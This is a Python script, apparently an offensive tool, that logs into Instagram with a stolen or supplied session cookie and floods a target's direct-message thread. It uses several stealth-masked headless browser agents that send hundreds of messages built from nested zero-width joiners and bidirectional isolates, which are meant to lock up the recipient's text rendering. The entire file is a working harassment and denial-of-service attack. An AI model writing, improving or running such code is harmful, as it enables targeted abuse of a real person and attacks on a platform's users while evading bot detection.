# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (RECURSIVE-VOID V25)
# 📅 STATUS: SHAPER-ATTACK | 4-AGENT TOTAL | RENDER-LOCK

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.2, 0.4)    
REST_AFTER_STRIKES = 100   
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()
sys.stdout.reconfigure(encoding='utf-8')

def get_unrenderable_payload():
    """Forces HarfBuzz/CoreText into an infinite font-fallback loop."""
    u_id = random.randint(1000, 9999)
    # \u200D = Zero Width Joiner (Forces glyph bonding)
    # \u2068 = First Strong Isolate (Forces new render tree branch)
    # \u200B = Zero Width Space (Forces infinite line-wrap checks)
    zwj, iso, brk, pop = "\u200D", "\u2068", "\u200B", "\u2069"
    
    header = f"👑 PRAVEER OWNS THE MATRIX 👑 [VOID_DEPTH:{u_id}]"
    
    body = []
    for i in range(250):
        # We bond characters using ZWJ while nesting isolates.
        # This tells the browser: "This is one single character that is 10,000px wide."
        # It bypasses 'Containment' because the browser must shape the glyph first.
        body.append(f"{iso}X{zwj}O{zwj}{i}{zwj}X{zwj}O{brk}{pop}")
        
    return f"{header}\n\u2060".join(body).strip()[:9998]

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    machine = os.environ.get('MACHINE_ID', '1')
    print(f"[{timestamp}] M-{machine} Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        # Attack the GPU process directly
        chrome_options.add_argument("--enable-gpu-rasterization")
        chrome_options.add_argument("--force-gpu-mem-available-mb=4096")
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"node_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        driver.custom_temp_path = temp_dir
        return driver

def adaptive_send(driver, text):
    try:
        box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
        driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, text)
        time.sleep(0.3)
        box.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        strike_counter = 0
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            if adaptive_send(driver, "🚀 RECURSIVE-VOID MATRIX ACTIVE"):
                while (time.time() - global_start) < TOTAL_DURATION:
                    payload = get_unrenderable_payload()
                    if adaptive_send(driver, payload):
                        strike_counter += 1
                        with COUNTER_LOCK:
                            global GLOBAL_SENT
                            GLOBAL_SENT += 1
                        
                        if strike_counter % REST_AFTER_STRIKES == 0:
                            log_status(agent_id, "✅ 100 Hits. Resting.")
                            time.sleep(REST_DURATION)
                        else:
                            log_status(agent_id, f"Delivered (Total: {GLOBAL_SENT})")
                    time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
